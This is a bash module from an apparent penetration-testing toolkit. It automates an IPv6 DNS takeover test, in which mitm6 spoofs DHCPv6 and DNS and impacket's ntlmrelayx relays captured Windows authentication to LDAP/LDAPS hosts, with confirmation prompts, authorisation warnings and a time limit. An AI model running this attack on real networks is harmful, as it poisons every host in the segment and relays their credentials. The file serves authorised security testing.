#!/usr/bin/env bash

# scans/mitm6.sh
# IPv6 DNS Takeover test (mitm6 + impacket-ntlmrelayx).
#
# Unlike every other test in lazymap, this one is ACTIVE: mitm6 answers DHCPv6
# solicits and spoofs DNS for the whole broadcast domain, and ntlmrelayx relays
# the authentication it captures. It affects hosts beyond the target list, so it
# only runs when explicitly requested with --mitm6, is bounded by a timer, and
# asks for confirmation unless -y was given.

source "$LAZYMAP_DIR/lib/compat.sh"
source "$LAZYMAP_DIR/lib/colors.sh"
source "$LAZYMAP_DIR/lib/domain.sh"

MITM6_DEFAULT_DURATION=300
MITM6_RUNNING=false
MITM6_WATCHDOG_PID=""
MITM6_START_TS=""

# Resolve the impacket relay binary under either of its packaged names.
resolve_ntlmrelayx() {
    if command -v impacket-ntlmrelayx &>/dev/null; then
        printf 'impacket-ntlmrelayx'
    elif command -v ntlmrelayx.py &>/dev/null; then
        printf 'ntlmrelayx.py'
    else
        printf ''
    fi
}

# Build the LDAP/LDAPS relay target list from the nmap LDAP results.
# ntlmrelayx against LDAP normally fails on signing, so 636 is preferred.
collect_mitm6_targets() {
    local output_dir="$1"
    local gnmap="$output_dir/nmap/LDAP.gnmap"
    local out="$output_dir/mitm6/relay_targets.txt"
    : > "$out"

    [ -f "$gnmap" ] || return 0

    local ip
    while IFS= read -r ip; do
        [ -n "$ip" ] && echo "ldaps://$ip" >> "$out"
    done < <(awk '/^Host: / && /Ports:.*636\/open\// {print $2}' "$gnmap" | sort -u)

    if [ ! -s "$out" ]; then
        while IFS= read -r ip; do
            [ -n "$ip" ] && echo "ldap://$ip" >> "$out"
        done < <(awk '/^Host: / && /Ports:.*389\/open\// {print $2}' "$gnmap" | sort -u)
        [ -s "$out" ] && echo -e "${YELLOW}No LDAPS (636) hosts found; falling back to LDAP (389). Relaying may fail if signing is enforced.${NC}"
    fi
}

mitm6_confirm() {
    local iface="$1" domain="$2" duration="$3" count="$4"

    echo -e "\n${BLUE}======================================================${NC}"
    echo -e "${YELLOW}⚠  Active attack: IPv6 DNS Takeover (mitm6)${NC}"
    echo -e "${BLUE}======================================================${NC}"
    echo -e "${CYAN}Interface     : ${iface}${NC}"
    echo -e "${CYAN}Domain        : ${domain}${NC}"
    echo -e "${CYAN}Relay targets : ${count}${NC}"
    echo -e "${CYAN}Duration      : ${duration}s${NC}"
    echo -e "${BLUE}------------------------------------------------------${NC}"
    echo -e "${RED}This spoofs DHCPv6 and DNS for every Windows host in this${NC}"
    echo -e "${RED}broadcast domain, not just the targets, and relays the${NC}"
    echo -e "${RED}credentials it captures. Only run it with authorisation${NC}"
    echo -e "${RED}covering this network segment.${NC}"
    echo -e "${BLUE}======================================================${NC}"

    if [ "$ASSUME_YES" = true ]; then
        echo -e "${YELLOW}-y given, proceeding without confirmation.${NC}\n"
        return 0
    fi
    if [ ! -t 0 ]; then
        echo -e "${YELLOW}Not an interactive terminal. Skipping. Use -y to run it unattended.${NC}\n"
        return 1
    fi

    echo -e "${YELLOW}Type the interface name (${iface}) to start, anything else to skip:${NC}"
    local reply
    read -r reply
    reply="${reply//$'\r'/}"
    if [ "$reply" = "$iface" ]; then
        echo
        return 0
    fi
    echo -e "${YELLOW}Skipping the mitm6 test.${NC}\n"
    return 1
}

# Screen session names, mirroring how Responder is launched.
MITM6_SCREEN="lazymap-mitm6"
RELAY_SCREEN="lazymap-ntlmrelayx"

# screen_session_pid <name> -> pid of the screen daemon for that session
screen_session_pid() {
    screen -ls 2>/dev/null | sed -n "s/^[[:space:]]*\([0-9][0-9]*\)\.$1[[:space:]].*/\1/p" | head -n1
}

# mitm6_kill_screen <session name>
mitm6_kill_screen() {
    local name="$1"
    local pid
    pid="$(screen_session_pid "$name")"
    [ -n "$pid" ] && kill_tree "$pid"
    screen -S "$name" -X quit >/dev/null 2>&1
    screen -wipe >/dev/null 2>&1
    return 0
}

mitm6_stop() {
    # Cancel the watchdog first so it cannot fire mid-teardown.
    if [ -n "$MITM6_WATCHDOG_PID" ]; then
        kill_tree "$MITM6_WATCHDOG_PID"
        MITM6_WATCHDOG_PID=""
    fi
    mitm6_kill_screen "$MITM6_SCREEN"
    mitm6_kill_screen "$RELAY_SCREEN"
    MITM6_RUNNING=false
    sleep 1
}

# Called from the interrupt handler: Ctrl+C must not leave the attack running.
mitm6_emergency_stop() {
    # Do not trust the flag alone: a session that exists must be torn down
    # whatever state the script thinks it is in.
    if [ "$MITM6_RUNNING" != true ] \
       && [ -z "$(screen_session_pid "$MITM6_SCREEN")" ] \
       && [ -z "$(screen_session_pid "$RELAY_SCREEN")" ]; then
        return 0
    fi
    echo -e "${YELLOW}Stopping mitm6 and ntlmrelayx...${NC}"
    mitm6_stop
    mitm6_verify_stopped
}

# Verify nothing survived, and say so loudly if it did.
mitm6_verify_stopped() {
    local leftover
    leftover=$(pgrep -f 'mitm6 -d|ntlmrelayx' 2>/dev/null | grep -c . )
    if [ "$leftover" -gt 0 ]; then
        echo -e "${RED}Warning: ${leftover} mitm6/ntlmrelayx process(es) are still running.${NC}"
        echo -e "${RED}Stop them before leaving the network: pkill -f mitm6; pkill -f ntlmrelayx${NC}"
    else
        echo -e "${GREEN}mitm6 and ntlmrelayx stopped; the network is no longer being poisoned.${NC}"
    fi
}

# Pull the evidence out of the relay log: which accounts authenticated and
# whether anything was written to the loot directory.
summarise_mitm6() {
    local output_dir="$1"
    local relay_log="$2"
    local mitm6_log="$3"
    local loot_dir="$4"

    local relayed=""
    if [ -f "$relay_log" ]; then
        relayed=$(grep -aoE 'Authenticating connection from [^ ]+ against [^ ]+ SUCCEED' "$relay_log" \
                  | sed -E 's/Authenticating connection from //; s/ against .*//' | sort -u)
    fi

    local spoofed=0
    [ -f "$mitm6_log" ] && spoofed=$(grep -ac 'Sent spoofed reply' "$mitm6_log")

    local loot_count=0
    [ -d "$loot_dir" ] && loot_count=$(find "$loot_dir" -type f 2>/dev/null | grep -c .)

    echo -e "${BLUE}------------------------------------------------------${NC}"
    echo -e "${CYAN}Spoofed DNS replies sent : ${spoofed}${NC}"
    echo -e "${CYAN}Loot files written       : ${loot_count}${NC}"

    if [ -n "$relayed" ]; then
        local count
        count=$(printf '%s\n' "$relayed" | grep -c .)
        echo -e "${RED}Relayed authentications  : ${count}${NC}"
        printf '%s\n' "$relayed" | while IFS= read -r u; do
            [ -n "$u" ] && echo -e "${GREEN}    + $u${NC}"
        done
        printf '%s\n' "$relayed" > "$output_dir/mitm6/relayed_accounts.txt"
        echo -e "${RED}VULNERABLE: IPv6 DNS takeover succeeded and authentication was relayed.${NC}"
    elif [ "$spoofed" -gt 0 ]; then
        echo -e "${YELLOW}DNS was spoofed successfully but no authentication was relayed in ${MITM6_LAST_DURATION}s.${NC}"
        echo -e "${YELLOW}IPv6 is reachable and answering; try a longer --mitm6-time during business hours.${NC}"
    else
        echo -e "${GREEN}No DHCPv6/DNS activity observed. IPv6 takeover does not appear exploitable here.${NC}"
    fi
    echo -e "${BLUE}------------------------------------------------------${NC}"
}

mitm6_start() {
    local output_dir="$1"

    echo -e "${YELLOW}Starting IPv6 DNS Takeover test (mitm6).${NC}\n"

    local iface
    iface="$(opt_get mitm6_interface)"
    [ -z "$iface" ] && iface="$(opt_get responder_interface)"
    if [ -z "$iface" ]; then
        echo -e "${RED}No interface specified. Use --mitm6-interface <iface> (or --interface). Skipping.${NC}\n"
        return 0
    fi

    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}mitm6 and ntlmrelayx need root. Re-run with sudo. Skipping.${NC}\n"
        return 0
    fi

    if ! command -v mitm6 &>/dev/null; then
        echo -e "${RED}'mitm6' is not installed ('pipx install mitm6'). Skipping.${NC}\n"
        return 0
    fi
    local relay_bin
    relay_bin="$(resolve_ntlmrelayx)"
    if [ -z "$relay_bin" ]; then
        echo -e "${RED}impacket's ntlmrelayx is not installed ('pipx install impacket'). Skipping.${NC}\n"
        return 0
    fi
    local domain
    domain="$(resolve_ad_domain "$output_dir")"
    if [ -z "$domain" ]; then
        echo -e "${YELLOW}Could not determine the Active Directory domain.${NC}"
        echo -e "${YELLOW}Skipping the mitm6 test. Re-run with --domain <REALM> to enable it.${NC}\n"
        return 0
    fi

    mkdir -p "$output_dir/mitm6"
    collect_mitm6_targets "$output_dir"
    local targets_file="$output_dir/mitm6/relay_targets.txt"
    if [ ! -s "$targets_file" ]; then
        echo -e "${YELLOW}No LDAP/LDAPS relay targets found. Skipping the mitm6 test.${NC}\n"
        return 0
    fi

    local duration
    duration="$(opt_get mitm6_duration)"
    [ -z "$duration" ] && duration="$MITM6_DEFAULT_DURATION"
    MITM6_LAST_DURATION="$duration"

    local target_count
    target_count=$(grep -c . "$targets_file")

    if [ -n "$(opt_get responder_interface)" ]; then
        echo -e "${YELLOW}Note: Responder is also running. Both answer WPAD, which can spoil the${NC}"
        echo -e "${YELLOW}relay. Consider running the mitm6 test on its own.${NC}\n"
    fi

    mitm6_confirm "$iface" "$domain" "$duration" "$target_count" || return 0

    local loot_dir="$output_dir/mitm6/loot"
    local relay_log="$output_dir/mitm6/ntlmrelayx.log"
    local mitm6_log="$output_dir/mitm6/mitm6.log"
    mkdir -p "$loot_dir"

    # WPAD host in the fwpad.<domain> form. DNS is case-insensitive, so the
    # realm's own casing is kept.
    local wpad_host
    wpad_host="fwpad.$domain"

    local relay_target_arg
    if [ "$target_count" -eq 1 ]; then
        relay_target_arg="-t $(head -n1 "$targets_file")"
    else
        relay_target_arg="-tf $targets_file"
    fi

    # Launched as direct children so the Ctrl+C handler, which terminates this
    # script's children, also tears the attack down.
    # Armed before anything is launched: an interrupt in the seconds between
    # starting a screen session and marking the attack running would otherwise
    # leave it poisoning the network unattended.
    MITM6_RUNNING=true

    echo -e "${GREEN}Starting ntlmrelayx against ${target_count} target(s).${NC}"
    echo -e "${CYAN}  $relay_bin -6 $relay_target_arg -wh $wpad_host -l $loot_dir${NC}"
    screen -dmS "$RELAY_SCREEN" bash -c \
        "$relay_bin -6 $relay_target_arg -wh '$wpad_host' -l '$loot_dir' > '$relay_log' 2>&1"
    sleep 3

    echo -e "${GREEN}Starting mitm6 on ${iface} for domain ${domain}.${NC}"
    echo -e "${CYAN}  mitm6 -d $domain -i $iface${NC}"
    screen -dmS "$MITM6_SCREEN" bash -c \
        "mitm6 -d '$domain' -i '$iface' > '$mitm6_log' 2>&1"
    sleep 2

    if [ -z "$(screen_session_pid "$MITM6_SCREEN")" ] && [ -z "$(screen_session_pid "$RELAY_SCREEN")" ]; then
        echo -e "${RED}Neither screen session started. Skipping the mitm6 test.${NC}"
        tail -n 5 "$relay_log" "$mitm6_log" 2>/dev/null | sed 's/^/    /'
        mitm6_stop
        return 0
    fi

    MITM6_START_TS=$(date +%s)

    # The attack is time-boxed even though the scan no longer blocks on it: a
    # watchdog tears it down after the duration whatever else is still running.
    ( sleep "$duration"; mitm6_kill_screen "$MITM6_SCREEN"; mitm6_kill_screen "$RELAY_SCREEN" ) >/dev/null 2>&1 &
    MITM6_WATCHDOG_PID=$!

    echo -e "${BLUE}------------------------------------------------------${NC}"
    echo -e "${GREEN}mitm6 is running in the background for up to ${duration}s.${NC}"
    echo -e "${CYAN}  Watch it live : screen -r ${MITM6_SCREEN}${NC}"
    echo -e "${CYAN}  Watch relays  : screen -r ${RELAY_SCREEN}${NC}"
    echo -e "${CYAN}  (detach again with Ctrl+A then D)${NC}"
    echo -e "${CYAN}The remaining scans continue while it collects.${NC}"
    echo -e "${BLUE}------------------------------------------------------${NC}\n"
    return 0
}

# Stops the attack and reports what it captured. Called once the other scans
# have finished, so mitm6 collects for as long as they take, up to the limit.
mitm6_finish() {
    local output_dir="$1"
    [ "$MITM6_RUNNING" = true ] || return 0

    local loot_dir="$output_dir/mitm6/loot"
    local relay_log="$output_dir/mitm6/ntlmrelayx.log"
    local mitm6_log="$output_dir/mitm6/mitm6.log"

    local duration
    duration="$(opt_get mitm6_duration)"
    [ -z "$duration" ] && duration="$MITM6_DEFAULT_DURATION"
    MITM6_LAST_DURATION="$duration"

    local elapsed=0
    [ -n "$MITM6_START_TS" ] && elapsed=$(( $(date +%s) - MITM6_START_TS ))

    # If the other scans finished quickly, give mitm6 the rest of its window.
    if [ "$elapsed" -lt "$duration" ]; then
        local remaining=$(( duration - elapsed ))
        echo -e "${YELLOW}Other scans finished. Letting mitm6 run its remaining ${remaining}s.${NC}"
        local waited=0
        local step=15
        while [ "$waited" -lt "$remaining" ]; do
            sleep "$step"
            waited=$(( waited + step ))
            [ "$waited" -gt "$remaining" ] && waited="$remaining"
            local hits=0
            [ -f "$relay_log" ] && hits=$(grep -ac 'SUCCEED' "$relay_log")
            echo -e "${CYAN}  $(( elapsed + waited ))/${duration}s elapsed - relayed authentications so far: ${hits}${NC}"
        done
    else
        echo -e "${YELLOW}mitm6 reached its ${duration}s limit while the other scans ran.${NC}"
    fi

    echo -e "${GREEN}Stopping mitm6 and ntlmrelayx.${NC}"
    mitm6_stop
    mitm6_verify_stopped

    summarise_mitm6 "$output_dir" "$relay_log" "$mitm6_log" "$loot_dir"
    mark_completed "mitm6"
    echo -e "${BLUE}IPv6 DNS Takeover test completed. Output saved to $output_dir/mitm6.${NC}\n"
}
